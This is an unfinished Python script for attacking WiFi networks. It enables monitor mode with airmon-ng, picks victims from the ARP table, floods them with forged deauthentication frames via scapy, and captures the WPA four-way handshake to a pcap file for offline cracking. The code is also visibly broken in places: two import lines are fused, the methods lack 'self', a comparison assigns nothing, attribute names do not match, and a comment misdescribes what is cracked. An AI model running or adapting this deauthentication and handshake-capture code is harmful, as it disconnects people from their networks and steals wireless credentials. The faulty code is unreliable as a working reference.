import os
import subprocess
import re
import time
import hashlib
import hmac
import binascii
from threading import Threadfrom pbkdf2 import PBKDF2
from scapy.all import *
from scapy.layers.dot11 import *

def setup_network()->None:
    print(f"[!] Setting up network interface to allow for WiFi attacks...")
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout = subprocess.DEVNULL)
    subprocess.run(['airmon-ng', 'start', 'wlan1'], stdout = subprocess.DEVNULL)

def teardown_network()->None:
    print(f"[!] Reverting back network interface changes...")
    subprocess.run(['airmon-ng', 'stop', 'wlan1mon'], stdout = subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', 'wlan1', 'down'], stdout = subprocess.DEVNULL)
    subprocess.run(['iw', 'wlan1', 'set', 'type', 'managed'], stdout = subprocess.DEVNULL)
    subprocess.run(['systemctl', 'start', 'NetworkManager'], stdout = subprocess.DEVNULL)

def get_iface()->str:
    print(f"Getting interface")
    try:
        result = subprocess.run(['ip', '-o', 'link', 'show'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'mon' in line:
                match = re.search(r'^\d+:\s+([^:]+):', line)
                if match:
                    print(f"Got iface: {match.group(1).strip()}")
                    return match.group(1).strip()
    except Exception as e:
        print(f"[-] Error: {e}")
    return None

def get_local_devices() -> list:
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    lines = result.stdout.splitlines()
    for i, line in enumerate(lines):
        print(f"{i}. {line}")

    selection = input("[*] List the clients you want removed: ")  
    selected_indices = [int(x.strip()) for x in selection.split(',')]
    bssids = []
    for idx in selected_indices:
        if 0 <= idx < len(lines):
            match = re.search(r'(([0-9a-fA-F]{1,2}[:\-]){5}[0-9a-fA-F]{1,2})', lines[idx])
            if match:
                bssids.append(match.group(1))
    return bssids

class HandshakeCracker:
    def __init__(self, interface:str):
        self.interface = interface
        self.from_frames = 0
        self.to_frames =0
        self.capture_handshake = False
        self.ap_filter = ""
        self.handshake_file = ""
    
    def generate_wordlists() -> None:
        print("Work on later")

    def send_deauth(bssid: str, client_list:list, channel: int)-> None:
        i_face = get_iface()
        subprocess.run(['iwconfig', i_face, 'channel', str(channel)])
        for client in client_list:
            print(f"Sending 35 deauth requests to {client} with bssid: {bssid}")
            dot11 = Dot11(addr1=client, addr2=bssid,addr3=bssid)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            sendp(packet, inter=0.1, count=35, iface=i_face, verbose=1)

    def check_for_handshake(self, packet) ->bool:
        if EAPOL in packet and ((str(packet.addr2) == self.ap_filter) or (str(packet.addr1) == self.ap_filter)):
            pktdump = PcapWriter(self.handshake_file, append=True, sync=True)
            pktdump.write(packet)

            TO_DS = 0x01
            to_ds (packet.Fcfield & TO_DS) !=0

            if to_ds:
                self.to_frames +=1
                print(f"[+] AP -> Client ({self.to_frames}/2)")
            else:
                self.from_frames +=1
                print(f"[+] Client -> AP ({self.from_frames}/2)")
            
            #Since we are trying to crack the PIN from the 4 way handshake we need to capture all 4 frames
            if self.to_frames >=2 and self.from_frames >=2:
                self.captured_handshake = True
                return True
            return False
    
    
